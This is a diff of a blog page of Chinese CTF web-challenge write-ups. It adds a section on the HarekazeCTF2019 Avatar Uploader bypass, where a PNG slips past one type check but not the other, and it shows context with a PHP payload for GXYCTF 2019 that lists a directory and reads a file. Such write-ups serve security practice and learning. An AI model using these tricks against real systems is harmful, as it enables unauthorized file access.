@@ -82,14 +82,15 @@
 
 
 
-<meta name="description" content="GXYCTF 2019 禁止套娃 .git文件泄露, 泄露出来的源码和真实源码竟然有差异, 我傻了 payload: 12var_dump(scandir(chr(ord(hebrevc(crypt(phpversion()))))));readfile(next(array_reverse(scandir(chr(ord(hebrevc(crypt(phpversion()))))))));">
+<meta name="description" content="HarekazeCTF2019 Avatar Uploader 1 原来是个misc题目 可以上传文件, 只允许上传png , 关键源码 1234567891011121314151617181920212223// check file sizeif ($_FILES[&amp;apos;file&amp;apos;][&amp;apos;size&amp;apos;] &amp;gt; 256000) &amp;#123;  error(&amp;">
 <meta name="keywords" content="CTF WEB">
 <meta property="og:type" content="article">
 <meta property="og:title" content="MiscInWeb &amp; python web[working forever]">
 <meta property="og:url" content="http://yoursite.com/2019/05/27/MiscInWeb/index.html">
 <meta property="og:site_name" content="CH4SER || 自闭室">
-<meta property="og:description" content="GXYCTF 2019 禁止套娃 .git文件泄露, 泄露出来的源码和真实源码竟然有差异, 我傻了 payload: 12var_dump(scandir(chr(ord(hebrevc(crypt(phpversion()))))));readfile(next(array_reverse(scandir(chr(ord(hebrevc(crypt(phpversion()))))))));">
+<meta property="og:description" content="HarekazeCTF2019 Avatar Uploader 1 原来是个misc题目 可以上传文件, 只允许上传png , 关键源码 1234567891011121314151617181920212223// check file sizeif ($_FILES[&amp;apos;file&amp;apos;][&amp;apos;size&amp;apos;] &amp;gt; 256000) &amp;#123;  error(&amp;">
 <meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/images/image-20200110151652743.png">
 <meta property="og:image" content="http://yoursite.com/images/image-20191230154140515.png">
 <meta property="og:image" content="http://yoursite.com/images/image-20191230153904533.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/61510960-a5959180-aa27-11e9-8e97-85fc732fb9ec.png">
@@ -112,11 +113,11 @@
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/58483762-6e2b0700-8193-11e9-9d00-fb36d55a8adf.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/58484538-d6c6b380-8194-11e9-8abd-872dfbe583b5.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/59102510-e1d0cf00-895e-11e9-9d95-66589f9ad9ee.png">
-<meta property="og:updated_time" content="2019-12-30T07:41:49.012Z">
+<meta property="og:updated_time" content="2020-01-10T07:17:05.307Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="MiscInWeb &amp; python web[working forever]">
-<meta name="twitter:description" content="GXYCTF 2019 禁止套娃 .git文件泄露, 泄露出来的源码和真实源码竟然有差异, 我傻了 payload: 12var_dump(scandir(chr(ord(hebrevc(crypt(phpversion()))))));readfile(next(array_reverse(scandir(chr(ord(hebrevc(crypt(phpversion()))))))));">
-<meta name="twitter:image" content="http://yoursite.com/images/image-20191230154140515.png">
+<meta name="twitter:description" content="HarekazeCTF2019 Avatar Uploader 1 原来是个misc题目 可以上传文件, 只允许上传png , 关键源码 1234567891011121314151617181920212223// check file sizeif ($_FILES[&amp;apos;file&amp;apos;][&amp;apos;size&amp;apos;] &amp;gt; 256000) &amp;#123;  error(&amp;">
+<meta name="twitter:image" content="http://yoursite.com/images/image-20200110151652743.png">
 
 
 
@@ -187,7 +188,7 @@
       </a>
     </div>
       
-        <p class="site-subtitle">别浪费时间了,这里没什么值得你看的东西</p>
+        <p class="site-subtitle">要温柔而强大ヾ(≧▽≦*)o</p>
       
   </div>
 
@@ -356,8 +357,8 @@
               
                 <span class="post-meta-item-text">Post modified&#58;</span>
               
-              <time title="Post modified" itemprop="dateModified" datetime="2019-12-30T15:41:49+08:00">
-                2019-12-30
+              <time title="Post modified" itemprop="dateModified" datetime="2020-01-10T15:17:05+08:00">
+                2020-01-10
               </time>
             
           </span>
@@ -406,7 +407,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  5k
+                  5.2k
                 </span>
               
 
@@ -422,7 +423,7 @@
                   <span class="post-meta-item-text">Reading time &asymp;</span>
                 
                 <span title="Reading time">
-                  25
+                  26
                 </span>
               
             </div>
@@ -443,7 +444,14 @@
       
 
       
-        <h2 id="GXYCTF-2019-禁止套娃">GXYCTF 2019 禁止套娃</h2>
+        <h2 id="HarekazeCTF2019-Avatar-Uploader-1">HarekazeCTF2019 Avatar Uploader 1</h2>
+<p>原来是个misc题目</p>
+<p>可以上传文件, 只允许上传png , 关键源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">// check file size</span><br><span class="line">if ($_FILES[&apos;file&apos;][&apos;size&apos;] &gt; 256000) &#123;</span><br><span class="line">  error(&apos;Uploaded file is too large.&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// check file type</span><br><span class="line">$finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">$type = finfo_file($finfo, $_FILES[&apos;file&apos;][&apos;tmp_name&apos;]);</span><br><span class="line">finfo_close($finfo);</span><br><span class="line">if (!in_array($type, [&apos;image/png&apos;])) &#123;</span><br><span class="line">  error(&apos;Uploaded file is not PNG format.&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// check file width/height</span><br><span class="line">$size = getimagesize($_FILES[&apos;file&apos;][&apos;tmp_name&apos;]);</span><br><span class="line">if ($size[0] &gt; 256 || $size[1] &gt; 256) &#123;</span><br><span class="line">  error(&apos;Uploaded image is too large.&apos;);</span><br><span class="line">&#125;</span><br><span class="line">if ($size[2] !== IMAGETYPE_PNG) &#123;</span><br><span class="line">  // I hope this never happens...</span><br><span class="line">  error(&apos;What happened...? OK, the flag for part 1 is: &lt;code&gt;&apos; . getenv(&apos;FLAG1&apos;) . &apos;&lt;/code&gt;&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>同时使用了<code>finfo_open</code>和<code>getimagesize</code>来判断类型, 前者可以识别png图片的第一行16进制的东西, 后者不行.</p>
+<p><img src="/images/image-20200110151652743.png" alt="image-20200110151652743"></p>
+<p>上传这个就可以了</p>
+<h2 id="GXYCTF-2019-禁止套娃">GXYCTF 2019 禁止套娃</h2>
 <p>.git文件泄露, 泄露出来的源码和真实源码竟然有差异, 我傻了</p>
 <p>payload:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(scandir(chr(ord(hebrevc(crypt(phpversion()))))));</span><br><span class="line">readfile(next(array_reverse(scandir(chr(ord(hebrevc(crypt(phpversion()))))))));</span><br></pre></td></tr></table></figure>
@@ -758,7 +766,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">38</span>
+                  <span class="site-state-item-count">39</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -850,7 +858,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#GXYCTF-2019-禁止套娃"><span class="nav-number">1.</span> <span class="nav-text">GXYCTF 2019 禁止套娃</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GXYCTF-2019-pingpingping"><span class="nav-number">2.</span> <span class="nav-text">GXYCTF 2019 pingpingping</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#忘了题目名字了"><span class="nav-number">3.</span> <span class="nav-text">忘了题目名字了</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN-2019-东南赛区-web4"><span class="nav-number">4.</span> <span class="nav-text">CISCN 2019 东南赛区 web4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#360ctf-立誓要成为admin的男人"><span class="nav-number">5.</span> <span class="nav-text">360ctf 立誓要成为admin的男人</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#swpuctf-2019-web2"><span class="nav-number">6.</span> <span class="nav-text">swpuctf 2019 web2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#swpuctf-2019-web3"><span class="nav-number">7.</span> <span class="nav-text">swpuctf 2019 web3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Insomni’hack-2019-Phuck2"><span class="nav-number">8.</span> <span class="nav-text">Insomni’hack 2019 Phuck2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hitcon2016-Leaking"><span class="nav-number">9.</span> <span class="nav-text">hitcon2016 Leaking</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#buuoj-unicorn-shop"><span class="nav-number">10.</span> <span class="nav-text">buuoj unicorn shop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ichunqiu-爆破-2"><span class="nav-number">11.</span> <span class="nav-text">ichunqiu 爆破-2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ichunqiu-爆破-1"><span class="nav-number">12.</span> <span class="nav-text">ichunqiu 爆破-1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ichunqiu-象棋"><span class="nav-number">13.</span> <span class="nav-text">ichunqiu 象棋</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ichunqiu-时间"><span class="nav-number">14.</span> <span class="nav-text">ichunqiu 时间</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2019-强网杯-高明的黑客"><span class="nav-number">15.</span> <span class="nav-text">2019 强网杯 高明的黑客</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ichunqiu-Look"><span class="nav-number">16.</span> <span class="nav-text">ichunqiu Look</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ichunqiu-try"><span class="nav-number">17.</span> <span class="nav-text">ichunqiu try</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ichunqiu-fuzzing"><span class="nav-number">18.</span> <span class="nav-text">ichunqiu fuzzing</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ichunqiu百度杯-登录"><span class="nav-number">19.</span> <span class="nav-text">ichunqiu百度杯 登录</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#HarekazeCTF2019-Avatar-Uploader-1"><span class="nav-number">1.</span> <span class="nav-text">HarekazeCTF2019 Avatar Uploader 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GXYCTF-2019-禁止套娃"><span class="nav-number">2.</span> <span class="nav-text">GXYCTF 2019 禁止套娃</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GXYCTF-2019-pingpingping"><span class="nav-number">3.</span> <span class="nav-text">GXYCTF 2019 pingpingping</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#忘了题目名字了"><span class="nav-number">4.</span> <span class="nav-text">忘了题目名字了</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN-2019-东南赛区-web4"><span class="nav-number">5.</span> <span class="nav-text">CISCN 2019 东南赛区 web4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#360ctf-立誓要成为admin的男人"><span class="nav-number">6.</span> <span class="nav-text">360ctf 立誓要成为admin的男人</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#swpuctf-2019-web2"><span class="nav-number">7.</span> <span class="nav-text">swpuctf 2019 web2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#swpuctf-2019-web3"><span class="nav-number">8.</span> <span class="nav-text">swpuctf 2019 web3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Insomni’hack-2019-Phuck2"><span class="nav-number">9.</span> <span class="nav-text">Insomni’hack 2019 Phuck2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hitcon2016-Leaking"><span class="nav-number">10.</span> <span class="nav-text">hitcon2016 Leaking</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#buuoj-unicorn-shop"><span class="nav-number">11.</span> <span class="nav-text">buuoj unicorn shop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ichunqiu-爆破-2"><span class="nav-number">12.</span> <span class="nav-text">ichunqiu 爆破-2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ichunqiu-爆破-1"><span class="nav-number">13.</span> <span class="nav-text">ichunqiu 爆破-1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ichunqiu-象棋"><span class="nav-number">14.</span> <span class="nav-text">ichunqiu 象棋</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ichunqiu-时间"><span class="nav-number">15.</span> <span class="nav-text">ichunqiu 时间</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2019-强网杯-高明的黑客"><span class="nav-number">16.</span> <span class="nav-text">2019 强网杯 高明的黑客</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ichunqiu-Look"><span class="nav-number">17.</span> <span class="nav-text">ichunqiu Look</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ichunqiu-try"><span class="nav-number">18.</span> <span class="nav-text">ichunqiu try</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ichunqiu-fuzzing"><span class="nav-number">19.</span> <span class="nav-text">ichunqiu fuzzing</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ichunqiu百度杯-登录"><span class="nav-number">20.</span> <span class="nav-text">ichunqiu百度杯 登录</span></a></li></ol></div>
             
 
           </div>
@@ -884,7 +892,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">65k</span>
+    <span title="Site words total count">67.8k</span>
   
 
   <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
